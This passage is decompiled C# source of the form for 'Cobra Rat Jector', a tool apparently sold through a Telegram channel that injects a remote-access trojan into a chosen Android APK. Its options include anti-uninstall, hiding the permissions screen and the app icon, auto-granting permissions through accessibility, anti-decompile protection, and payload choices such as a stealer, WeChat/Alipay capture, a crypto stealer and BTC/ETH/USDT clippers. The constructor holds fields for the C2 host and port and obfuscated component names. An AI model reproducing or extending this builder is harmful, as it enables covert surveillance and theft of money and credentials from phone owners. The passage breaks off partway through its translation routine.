		this.CLiname.ForeColor = System.Drawing.Color.White;
		this.CLiname.Location = new System.Drawing.Point(22, 141);
		this.CLiname.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.CLiname.Maximum = 2147483647.0;
		this.CLiname.Minimum = -2147483648.0;
		this.CLiname.Name = "CLiname";
		this.CLiname.Padding = new System.Windows.Forms.Padding(5);
		this.CLiname.Radius = 15;
		this.CLiname.RectColor = System.Drawing.Color.SkyBlue;
		this.CLiname.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.CLiname.Size = new System.Drawing.Size(228, 32);
		this.CLiname.Style = DrakeUI.Framework.UIStyle.Custom;
		this.CLiname.StyleCustomMode = true;
		this.CLiname.TabIndex = 19;
		this.CLiname.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.paneltargetfolder.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.paneltargetfolder.Controls.Add(this.Label4);
		this.paneltargetfolder.Controls.Add(this.FolderPath);
		this.paneltargetfolder.Controls.Add(this.Button1);
		this.paneltargetfolder.Location = new System.Drawing.Point(61, 234);
		this.paneltargetfolder.Name = "paneltargetfolder";
		this.paneltargetfolder.Size = new System.Drawing.Size(559, 128);
		this.paneltargetfolder.TabIndex = 20;
		this.ToolTip1.BackColor = System.Drawing.Color.Black;
		this.ToolTip1.ForeColor = System.Drawing.Color.White;
		this.checkkill.AutoSize = true;
		this.checkkill.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold);
		this.checkkill.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkkill.Location = new System.Drawing.Point(403, 233);
		this.checkkill.Name = "checkkill";
		this.checkkill.Size = new System.Drawing.Size(156, 28);
		this.checkkill.TabIndex = 28;
		this.checkkill.Text = "Draw Over Apps";
		this.ToolTip1.SetToolTip(this.checkkill, "Prevent Client Form Deleting the app");
		this.checkkill.UseVisualStyleBackColor = true;
		this.DrakeUIAvatar5.AvatarSize = 25;
		this.DrakeUIAvatar5.BackColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar5.FillColor = System.Drawing.Color.Black;
		this.DrakeUIAvatar5.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar5.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar5.Location = new System.Drawing.Point(274, 153);
		this.DrakeUIAvatar5.Name = "DrakeUIAvatar5";
		this.DrakeUIAvatar5.Size = new System.Drawing.Size(36, 28);
		this.DrakeUIAvatar5.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar5.Symbol = 61529;
		this.DrakeUIAvatar5.SymbolSize = 25;
		this.DrakeUIAvatar5.TabIndex = 36;
		this.DrakeUIAvatar5.Text = "DrakeUIAvatar5";
		this.ToolTip1.SetToolTip(this.DrakeUIAvatar5, "To Keep the App Connected After App close\r\nWe need to Show Sticky Notification");
		this.checkDraw.AutoSize = true;
		this.checkDraw.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold);
		this.checkDraw.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkDraw.Location = new System.Drawing.Point(403, 267);
		this.checkDraw.Name = "checkDraw";
		this.checkDraw.Size = new System.Drawing.Size(169, 28);
		this.checkDraw.TabIndex = 39;
		this.checkDraw.Text = "Hide Permissions Screen";
		this.ToolTip1.SetToolTip(this.checkDraw, "Prevent Client Form Deleting the app");
		this.checkDraw.UseVisualStyleBackColor = true;
		this.checkautoclick.AutoSize = true;
		this.checkautoclick.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold);
		this.checkautoclick.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkautoclick.Location = new System.Drawing.Point(403, 199);
		this.checkautoclick.Name = "checkautoclick";
		this.checkautoclick.Size = new System.Drawing.Size(178, 28);
		this.checkautoclick.TabIndex = 40;
		this.checkautoclick.Text = "Anti - Uninstall";
		this.ToolTip1.SetToolTip(this.checkautoclick, "Prevent Client Form Deleting the app");
		this.checkautoclick.UseVisualStyleBackColor = true;
		this.DrakeUIAvatar6.AvatarSize = 25;
		this.DrakeUIAvatar6.BackColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar6.FillColor = System.Drawing.Color.Black;
		this.DrakeUIAvatar6.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar6.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar6.Location = new System.Drawing.Point(361, 199);
		this.DrakeUIAvatar6.Name = "DrakeUIAvatar6";
		this.DrakeUIAvatar6.Size = new System.Drawing.Size(36, 28);
		this.DrakeUIAvatar6.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar6.Symbol = 61529;
		this.DrakeUIAvatar6.SymbolSize = 25;
		this.DrakeUIAvatar6.TabIndex = 41;
		this.DrakeUIAvatar6.Text = "DrakeUIAvatar6";
		this.ToolTip1.SetToolTip(this.DrakeUIAvatar6, "Auto Click Allow for Permission\r\n(Accessibility Required)");
		this.PictureBox1.Image = Craxs_Rat.My.Resources.Resources.LOGO;
		this.PictureBox1.Location = new System.Drawing.Point(233, 81);
		this.PictureBox1.Name = "PictureBox1";
		this.PictureBox1.Size = new System.Drawing.Size(169, 112);
		this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox1.TabIndex = 23;
		this.PictureBox1.TabStop = false;
		this.maintapcontrols.Alignment = System.Windows.Forms.TabAlignment.Left;
		this.maintapcontrols.Controls.Add(this.TabPage1);
		this.maintapcontrols.Controls.Add(this.list_activ);
		this.maintapcontrols.Controls.Add(this.TabPage3);
		this.maintapcontrols.Controls.Add(this.TabPage4);
		this.maintapcontrols.Dock = System.Windows.Forms.DockStyle.Fill;
		this.maintapcontrols.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed;
		this.maintapcontrols.FillColor = System.Drawing.Color.Black;
		this.maintapcontrols.Font = new System.Drawing.Font("Calibri", 12f);
		this.maintapcontrols.ItemSize = new System.Drawing.Size(87, 125);
		this.maintapcontrols.Location = new System.Drawing.Point(0, 0);
		this.maintapcontrols.MenuStyle = DrakeUI.Framework.UIMenuStyle.Custom;
		this.maintapcontrols.Multiline = true;
		this.maintapcontrols.Name = "maintapcontrols";
		this.maintapcontrols.SelectedIndex = 0;
		this.maintapcontrols.Size = new System.Drawing.Size(817, 629);
		this.maintapcontrols.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
		this.maintapcontrols.Style = DrakeUI.Framework.UIStyle.Custom;
		this.maintapcontrols.StyleCustomMode = true;
		this.maintapcontrols.TabBackColor = System.Drawing.Color.Black;
		this.maintapcontrols.TabIndex = 29;
		this.maintapcontrols.TabSelectedColor = System.Drawing.Color.FromArgb(21, 21, 21);
		this.maintapcontrols.TabSelectedForeColor = System.Drawing.Color.SkyBlue;
		this.maintapcontrols.TabSelectedHighColor = System.Drawing.Color.SkyBlue;
		this.maintapcontrols.TabUnSelectedForeColor = System.Drawing.Color.SkyBlue;
		this.maintapcontrols.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
		this.TabPage1.BackColor = System.Drawing.Color.Black;
		this.TabPage1.Controls.Add(this.PictureBox1);
		this.TabPage1.Controls.Add(this.Panel1);
		this.TabPage1.Location = new System.Drawing.Point(126, 0);
		this.TabPage1.Name = "TabPage1";
		this.TabPage1.Size = new System.Drawing.Size(691, 629);
		this.TabPage1.TabIndex = 0;
		this.TabPage1.Text = "Connection";
		this.list_activ.BackColor = System.Drawing.Color.Black;
		this.list_activ.Controls.Add(this.Label6);
		this.list_activ.Controls.Add(this.DrakeWidth_W1);
		this.list_activ.Controls.Add(this.checkprotector);
		this.list_activ.Controls.Add(this.panelactivitys);
		this.list_activ.Controls.Add(this.checkonlymain);
		this.list_activ.Controls.Add(this.CheckAutomatic);
		this.list_activ.Controls.Add(this.labeltargetapp);
		this.list_activ.Controls.Add(this.TargetApktext);
		this.list_activ.Controls.Add(this.selectapkbtn);
		this.list_activ.Controls.Add(this.paneltargetfolder);
		this.list_activ.Location = new System.Drawing.Point(126, 0);
		this.list_activ.Name = "list_activ";
		this.list_activ.Size = new System.Drawing.Size(691, 629);
		this.list_activ.TabIndex = 1;
		this.list_activ.Text = "Target";
		this.Label6.AutoSize = true;
		this.Label6.Enabled = false;
		this.Label6.Font = new System.Drawing.Font("Calibri", 13f);
		this.Label6.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label6.Location = new System.Drawing.Point(56, 204);
		this.Label6.Name = "Label6";
		this.Label6.Size = new System.Drawing.Size(97, 27);
		this.Label6.TabIndex = 31;
		this.Label6.Text = "Manually";
		this.DrakeWidth_W1.BackColor = System.Drawing.Color.SkyBlue;
		this.DrakeWidth_W1.Location = new System.Drawing.Point(61, 198);
		this.DrakeWidth_W1.Name = "DrakeWidth_W1";
		this.DrakeWidth_W1.Size = new System.Drawing.Size(589, 1);
		this.DrakeWidth_W1.TabIndex = 30;
		this.checkprotector.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.checkprotector.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkprotector.Enabled = false;
		this.checkprotector.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkprotector.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkprotector.Location = new System.Drawing.Point(198, 139);
		this.checkprotector.Name = "checkprotector";
		this.checkprotector.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkprotector.Size = new System.Drawing.Size(490, 29);
		this.checkprotector.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkprotector.TabIndex = 29;
		this.checkprotector.Text = "Protect App (Anti Decompile + Bypass protection)";
		this.panelactivitys.Controls.Add(this.Activlist);
		this.panelactivitys.Controls.Add(this.Label5);
		this.panelactivitys.Controls.Add(this.addactiv);
		this.panelactivitys.Controls.Add(this.removeactiv);
		this.panelactivitys.Location = new System.Drawing.Point(61, 368);
		this.panelactivitys.Name = "panelactivitys";
		this.panelactivitys.Size = new System.Drawing.Size(559, 239);
		this.panelactivitys.TabIndex = 28;
		this.Activlist.BackColor = System.Drawing.Color.FromArgb(20, 31, 20);
		this.Activlist.FillColor = System.Drawing.Color.FromArgb(20, 31, 20);
		this.Activlist.FillDisableColor = System.Drawing.Color.FromArgb(20, 31, 20);
		this.Activlist.Font = new System.Drawing.Font("Calibri", 12f);
		this.Activlist.ForeColor = System.Drawing.Color.Black;
		this.Activlist.HoverColor = System.Drawing.Color.Silver;
		this.Activlist.ItemSelectBackColor = System.Drawing.Color.FromArgb(140, 140, 140);
		this.Activlist.ItemSelectForeColor = System.Drawing.Color.SkyBlue;
		this.Activlist.Location = new System.Drawing.Point(16, 61);
		this.Activlist.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.Activlist.Name = "Activlist";
		this.Activlist.Padding = new System.Windows.Forms.Padding(7);
		this.Activlist.Radius = 15;
		this.Activlist.RectColor = System.Drawing.Color.SkyBlue;
		this.Activlist.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.Activlist.Size = new System.Drawing.Size(529, 158);
		this.Activlist.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Activlist.StyleCustomMode = true;
		this.Activlist.TabIndex = 21;
		this.Activlist.Text = "DrakeUIListBox1";
		this.removeactiv.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.removeactiv.Font = new System.Drawing.Font("Calibri", 9f);
		this.removeactiv.ForeColor = System.Drawing.Color.SkyBlue;
		this.removeactiv.Location = new System.Drawing.Point(342, 19);
		this.removeactiv.Name = "removeactiv";
		this.removeactiv.Size = new System.Drawing.Size(104, 34);
		this.removeactiv.TabIndex = 22;
		this.removeactiv.Text = "Remove -";
		this.removeactiv.UseVisualStyleBackColor = true;
		this.checkonlymain.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.checkonlymain.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkonlymain.Enabled = false;
		this.checkonlymain.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkonlymain.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkonlymain.Location = new System.Drawing.Point(198, 104);
		this.checkonlymain.Name = "checkonlymain";
		this.checkonlymain.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkonlymain.Size = new System.Drawing.Size(456, 29);
		this.checkonlymain.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkonlymain.TabIndex = 27;
		this.checkonlymain.Text = "only main activities";
		this.CheckAutomatic.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.CheckAutomatic.Cursor = System.Windows.Forms.Cursors.Hand;
		this.CheckAutomatic.Font = new System.Drawing.Font("Calibri", 12f);
		this.CheckAutomatic.ForeColor = System.Drawing.Color.SkyBlue;
		this.CheckAutomatic.Location = new System.Drawing.Point(40, 66);
		this.CheckAutomatic.Name = "CheckAutomatic";
		this.CheckAutomatic.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.CheckAutomatic.Size = new System.Drawing.Size(137, 29);
		this.CheckAutomatic.Style = DrakeUI.Framework.UIStyle.Custom;
		this.CheckAutomatic.TabIndex = 26;
		this.CheckAutomatic.Text = "Automatic";
		this.labeltargetapp.AutoSize = true;
		this.labeltargetapp.Enabled = false;
		this.labeltargetapp.Font = new System.Drawing.Font("Calibri", 13f);
		this.labeltargetapp.ForeColor = System.Drawing.Color.SkyBlue;
		this.labeltargetapp.Location = new System.Drawing.Point(193, 30);
		this.labeltargetapp.Name = "labeltargetapp";
		this.labeltargetapp.Size = new System.Drawing.Size(108, 27);
		this.labeltargetapp.TabIndex = 23;
		this.labeltargetapp.Text = "Target Apk";
		this.TargetApktext.BackColor = System.Drawing.Color.SkyBlue;
		this.TargetApktext.Enabled = false;
		this.TargetApktext.ForeColor = System.Drawing.Color.SkyBlue;
		this.TargetApktext.Location = new System.Drawing.Point(198, 66);
		this.TargetApktext.Name = "TargetApktext";
		this.TargetApktext.ReadOnly = true;
		this.TargetApktext.Size = new System.Drawing.Size(456, 32);
		this.TargetApktext.TabIndex = 24;
		this.selectapkbtn.Enabled = false;
		this.selectapkbtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.selectapkbtn.Font = new System.Drawing.Font("Calibri", 9f);
		this.selectapkbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.selectapkbtn.Location = new System.Drawing.Point(539, 33);
		this.selectapkbtn.Name = "selectapkbtn";
		this.selectapkbtn.Size = new System.Drawing.Size(115, 27);
		this.selectapkbtn.TabIndex = 25;
		this.selectapkbtn.Text = "Select";
		this.selectapkbtn.UseVisualStyleBackColor = true;
		this.TabPage3.BackColor = System.Drawing.Color.Black;
		this.TabPage3.Controls.Add(this.checkkill);
		this.TabPage3.Controls.Add(this.checkkeepscreen);
		this.TabPage3.Controls.Add(this.msgtext);
		this.TabPage3.Controls.Add(this.titletext);
		this.TabPage3.Controls.Add(this.DrakeUIAvatar6);
		this.TabPage3.Controls.Add(this.checkautoclick);
		this.TabPage3.Controls.Add(this.checkDraw);
		this.TabPage3.Controls.Add(this.Label14);
		this.TabPage3.Controls.Add(this.ComboPrims);
		this.TabPage3.Controls.Add(this.DrakeUIAvatar5);
		this.TabPage3.Controls.Add(this.Label12);
		this.TabPage3.Controls.Add(this.checksuper);
		this.TabPage3.Location = new System.Drawing.Point(126, 0);
		this.TabPage3.Name = "TabPage3";
		this.TabPage3.Size = new System.Drawing.Size(691, 629);
		this.TabPage3.TabIndex = 2;
		this.TabPage3.Text = "Options";
		this.msgtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.msgtext.FillColor = System.Drawing.Color.Black;
		this.msgtext.Font = new System.Drawing.Font("Calibri", 12f);
		this.msgtext.ForeColor = System.Drawing.Color.SkyBlue;
		this.msgtext.Location = new System.Drawing.Point(56, 268);
		this.msgtext.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.msgtext.Maximum = 2147483647.0;
		this.msgtext.Minimum = -2147483648.0;
		this.msgtext.Name = "msgtext";
		this.msgtext.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.msgtext.Radius = 10;
		this.msgtext.RectColor = System.Drawing.Color.SkyBlue;
		this.msgtext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.msgtext.Size = new System.Drawing.Size(254, 32);
		this.msgtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.msgtext.StyleCustomMode = true;
		this.msgtext.TabIndex = 45;
		this.msgtext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.msgtext.Watermark = "Notification Message";
		this.titletext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.titletext.FillColor = System.Drawing.Color.Black;
		this.titletext.Font = new System.Drawing.Font("Calibri", 12f);
		this.titletext.ForeColor = System.Drawing.Color.SkyBlue;
		this.titletext.Location = new System.Drawing.Point(56, 208);
		this.titletext.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.titletext.Maximum = 2147483647.0;
		this.titletext.Minimum = -2147483648.0;
		this.titletext.Name = "titletext";
		this.titletext.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.titletext.Radius = 10;
		this.titletext.RectColor = System.Drawing.Color.SkyBlue;
		this.titletext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.titletext.Size = new System.Drawing.Size(254, 32);
		this.titletext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.titletext.StyleCustomMode = true;
		this.titletext.TabIndex = 44;
		this.titletext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.titletext.Watermark = "Notification Title";
		this.Label14.AutoSize = true;
		this.Label14.Font = new System.Drawing.Font("Calibri", 13f);
		this.Label14.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label14.Location = new System.Drawing.Point(152, 394);
		this.Label14.Name = "Label14";
		this.Label14.Size = new System.Drawing.Size(132, 27);
		this.Label14.TabIndex = 38;
		this.Label14.Text = "Permissions :";
		this.ComboPrims.BackColor = System.Drawing.Color.Black;
		this.ComboPrims.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.ComboPrims.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
		this.ComboPrims.ForeColor = System.Drawing.Color.SkyBlue;
		this.ComboPrims.FormattingEnabled = true;
		this.ComboPrims.Items.AddRange(new object[8] { "ALL Permissions ", "Add Stealer", "Wechat/Alipay Capture", "Add Injection", "Crypto Stealer", "USDT Trc-20 Clipper", "BTC Clipper", "ETH Clipper" });
		this.ComboPrims.Location = new System.Drawing.Point(321, 392);
		this.ComboPrims.Name = "ComboPrims";
		this.ComboPrims.Size = new System.Drawing.Size(163, 32);
		this.ComboPrims.TabIndex = 37;
		this.Label12.AutoSize = true;
		this.Label12.Font = new System.Drawing.Font("Roboto Condensed", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label12.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label12.Location = new System.Drawing.Point(52, 153);
		this.Label12.Name = "Label12";
		this.Label12.Size = new System.Drawing.Size(216, 29);
		this.Label12.TabIndex = 35;
		this.Label12.Text = "Custome Notification";
		this.TabPage4.BackColor = System.Drawing.Color.Black;
		this.TabPage4.Controls.Add(this.log);
		this.TabPage4.Controls.Add(this.Button3);
		this.TabPage4.Location = new System.Drawing.Point(126, 0);
		this.TabPage4.Name = "TabPage4";
		this.TabPage4.Size = new System.Drawing.Size(691, 629);
		this.TabPage4.TabIndex = 3;
		this.TabPage4.Text = "Create";
		this.DrakeUIAvatar4.AvatarSize = 25;
		this.DrakeUIAvatar4.BackColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar4.FillColor = System.Drawing.Color.Black;
		this.DrakeUIAvatar4.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar4.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar4.Location = new System.Drawing.Point(628, 36);
		this.DrakeUIAvatar4.Name = "DrakeUIAvatar4";
		this.DrakeUIAvatar4.Size = new System.Drawing.Size(39, 35);
		this.DrakeUIAvatar4.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar4.StyleCustomMode = true;
		this.DrakeUIAvatar4.Symbol = 61453;
		this.DrakeUIAvatar4.SymbolSize = 25;
		this.DrakeUIAvatar4.TabIndex = 0;
		this.DrakeUIAvatar4.Text = "DrakeUIAvatar4";
		this.DrakeUITitlePanel2.Controls.Add(this.DrakeUIAvatar4);
		this.DrakeUITitlePanel2.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeUITitlePanel2.FillColor = System.Drawing.Color.Black;
		this.DrakeUITitlePanel2.Font = new System.Drawing.Font("Calibri", 9f);
		this.DrakeUITitlePanel2.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUITitlePanel2.Location = new System.Drawing.Point(0, 629);
		this.DrakeUITitlePanel2.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.DrakeUITitlePanel2.Name = "DrakeUITitlePanel2";
		this.DrakeUITitlePanel2.Padding = new System.Windows.Forms.Padding(0, 35, 0, 0);
		this.DrakeUITitlePanel2.Radius = 15;
		this.DrakeUITitlePanel2.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUITitlePanel2.Size = new System.Drawing.Size(817, 34);
		this.DrakeUITitlePanel2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUITitlePanel2.StyleCustomMode = true;
		this.DrakeUITitlePanel2.TabIndex = 31;
		this.DrakeUITitlePanel2.Text = "Cobra Rat    By    t.me/CobraRat";
		this.DrakeUITitlePanel2.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
		this.DrakeUITitlePanel2.TitleColor = System.Drawing.Color.Black;
		this.mnulpanel.Controls.Add(this.maintapcontrols);
		this.mnulpanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.mnulpanel.Location = new System.Drawing.Point(0, 0);
		this.mnulpanel.Name = "mnulpanel";
		this.mnulpanel.Size = new System.Drawing.Size(817, 629);
		this.mnulpanel.TabIndex = 0;
		this.autopanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.autopanel.Location = new System.Drawing.Point(0, 0);
		this.autopanel.Name = "autopanel";
		this.autopanel.Size = new System.Drawing.Size(817, 629);
		this.autopanel.TabIndex = 24;
		this.Panel5.Controls.Add(this.mnulpanel);
		this.Panel5.Controls.Add(this.autopanel);
		this.Panel5.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel5.Location = new System.Drawing.Point(0, 0);
		this.Panel5.Name = "Panel5";
		this.Panel5.Size = new System.Drawing.Size(817, 629);
		this.Panel5.TabIndex = 25;
		this.checkkeepscreen.AutoSize = true;
		this.checkkeepscreen.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold);
		this.checkkeepscreen.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkkeepscreen.Location = new System.Drawing.Point(403, 301);
		this.checkkeepscreen.Name = "checkkeepscreen";
		this.checkkeepscreen.Size = new System.Drawing.Size(166, 28);
		this.checkkeepscreen.TabIndex = 46;
		this.checkkeepscreen.Text = "Hide The Icon After Uninstall";
		this.ToolTip1.SetToolTip(this.checkkeepscreen, "Prevent Client Form Deleting the app");
		this.checkkeepscreen.UseVisualStyleBackColor = true;
		base.AutoScaleDimensions = new System.Drawing.SizeF(7f, 17f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.Black;
		base.ClientSize = new System.Drawing.Size(817, 663);
		base.Controls.Add(this.Panel5);
		base.Controls.Add(this.DrakeUITitlePanel2);
		this.DoubleBuffered = true;
		this.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
		base.Name = "Jector";
		base.ShowIcon = false;
		this.Text = "Cobra Rat Jector By t.me/CobraRat";
		this.Panel1.ResumeLayout(false);
		this.Panel1.PerformLayout();
		this.paneltargetfolder.ResumeLayout(false);
		this.paneltargetfolder.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
		this.maintapcontrols.ResumeLayout(false);
		this.TabPage1.ResumeLayout(false);
		this.list_activ.ResumeLayout(false);
		this.list_activ.PerformLayout();
		this.panelactivitys.ResumeLayout(false);
		this.panelactivitys.PerformLayout();
		this.TabPage3.ResumeLayout(false);
		this.TabPage3.PerformLayout();
		this.TabPage4.ResumeLayout(false);
		this.TabPage4.PerformLayout();
		this.DrakeUITitlePanel2.ResumeLayout(false);
		this.mnulpanel.ResumeLayout(false);
		this.Panel5.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	public Jector()
	{
		base.FormClosing += Form1_FormClosing;
		base.Load += Form1_Load;
		N__ask_prim_ = "AbddSfsvasDFBetgrnsrtnatrhjryghwrtgafsgfjbrTHAERgvergesrg";
		N__access_ask_ = "AbddSfsxasDFBetgrnsrteatrhjryghwrtjafsgfjbrTlAERevergesrg";
		N_newEngineWorkerins = "AbddSfsvasDFBetgrnsrtnatrhjxyghwftgafsgxjbrTHAERdvergesrg";
		N__srv_worker_ = "AbddSfsvasDFBetgrusrtuatfhjryghwstgafsgfjbrTHAERgvergesrg";
		N_cap_sc_ = "AbddSfsvasDFBetgsnsrtnxtrhjryghwstgafsgsfjbrTHAERgvergesrg";
		N_update_app_ = "AbddSfsvassDFBetzrnsrtnatrhjrcymhwrtgafsgfjbrmHAEugvergesrg";
		N_WackMeUpJob = "AbddSfsvasDtBetgrnvsrtnatrhjsryghwrtgafsgfjsbrTHAERgvergesrg";
		N_ClassGen = "AbddSfsvasDFvBetgrnsrtnavtrhjryghwrtgafssgfjbrTHuqAERbgvergesrg";
		N__ask_draw_ = "";
		N__ask_battary_ = "";
		N__CamActivity_ = "";
		N__SCRActivity_ = "";
		N__webviewer_ = "";
		N__scctrl_ = "AbddSfsvasDFvBetgrnsrtnavtrhjryghwrtgafssgfjbrTHuqAERbgvergesrg";
		newgetbyts = "";
		newsrvrun = "";
		split1 = "";
		split2 = "";
		split3 = "";
		split4 = "";
		newhost = "";
		newport = "";
		newkey = "";
		newalive = "";
		newname = "";
		neweco = "";
		newconect = "";
		newsokt = "";
		newstrtconct = "";
		newcnl = "";
		newcnm = "";
		newsndmthd = "";
		newforuce = "";
		newplgs = "";
		NEWRANDOM = "";
		KeepScreen = "off";
		ALLPRIMSLIST = new List<string>();
		cou = 1;
		TK = "BSN12345678901234567";
		need_write = false;
		need_battery = false;
		need_read = false;
		need_forground = false;
		need_syswinow = false;
		need_boot = false;
		need_all = false;
		ASKPRIM_all = false;
		Once = false;
		HoldMainThread = false;
		WorkingDir = "";
		FoundJava = false;
		apktemp = "";
		apktoolpath = "";
		Apksignerpath = "";
		ApkZIPpath = "";
		outputapk = "";
		originalapkname = "";
		Apkeditorpath = "";
		protectfinished = false;
		rshit = null;
		cou3 = 0;
		InitializeComponent();
	}

	public void Translateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
			{
				ComboPrims.Text = "Only Needed";
				return;
			}
			ComboPrims.Text = "只需要";
			Label7.Text = "用户名";
			Label3.Text = "连接键";
			Label1.Text = "主机名或 IP";
			Label2.Text = "连接端口";
			Label4.Text = "目标应用文件夹";
			Button1.Text = "选择";
			Label5.Text = "目标活动文件 (.smali)";
			addactiv.Text = "添加";
			removeactiv.Text = "删除";
			checksuper.Text = "无障碍服务";
			checkkill.Text = "反删除";
			checkautoclick.Text = "自动授予权限";
			checkDraw.Text = "授予在应用程序上绘制";
			checkkeepscreen.Text = "保持屏幕开启";
			CheckAutomatic.Text = Codes.Translate(CheckAutomatic.Text, "en", "zh");
			checkonlymain.Text = Codes.Translate(checkonlymain.Text, "en", "zh");
			checkprotector.Text = Codes.Translate(checkprotector.Text, "en", "zh");
			selectapkbtn.Text = Codes.Translate(selectapkbtn.Text, "en", "zh");
			addactiv.Text = Codes.Translate(addactiv.Text, "en", "zh");
			removeactiv.Text = Codes.Translate(removeactiv.Text, "en", "zh");
			Label6.Text = Codes.Translate(Label6.Text, "en", "zh");
			Label14.Text = "权限";
			titletext.Watermark = "通知标题";
			msgtext.Watermark = "通知消息";
			Label12.Text = "自定义通知";
			Button3.Text = "开始";
			maintapcontrols.TabPages[0].Text = "联系";
			maintapcontrols.TabPages[1].Text = "目标";
			maintapcontrols.TabPages[2].Text = "选项";
			maintapcontrols.TabPages[3].Text = "注入";
		}
		else
		{
			ComboPrims.Text = "فقط المطلوبة";
			Label7.Text = "إسم المستخدم";
			Label3.Text = "مفتاح الاتصال";
			Label1.Text = "هوست او أيبي";
			Label2.Text = "المنفذ";
			Label4.Text = "مجلد التطبيق الهدف";
			Button1.Text = "إختيار";
			Label5.Text = "ملف الحقن الهدف (.smali)";
			addactiv.Text = "إضافة";
			removeactiv.Text = "حذف";
			checksuper.Text = "صلاحية الوصول";
			checkkill.Text = "منع الحذف";
			checkautoclick.Text = "صلاحيات تلقائية";
			checkDraw.Text = "صلاحية ظهور فوق التطبيقات";
			Label14.Text = "الصلاحيات";
			titletext.Watermark = "عنوان الأشعار";
			msgtext.Watermark = "محتوى الأشعار";
			Label12.Text = "إشعار مخصص";
			CheckAutomatic.Text = Codes.Translate(CheckAutomatic.Text, "en", "ar");
			checkonlymain.Text = Codes.Translate(checkonlymain.Text, "en", "ar");
			checkprotector.Text = Codes.Translate(checkprotector.Text, "en", "ar");
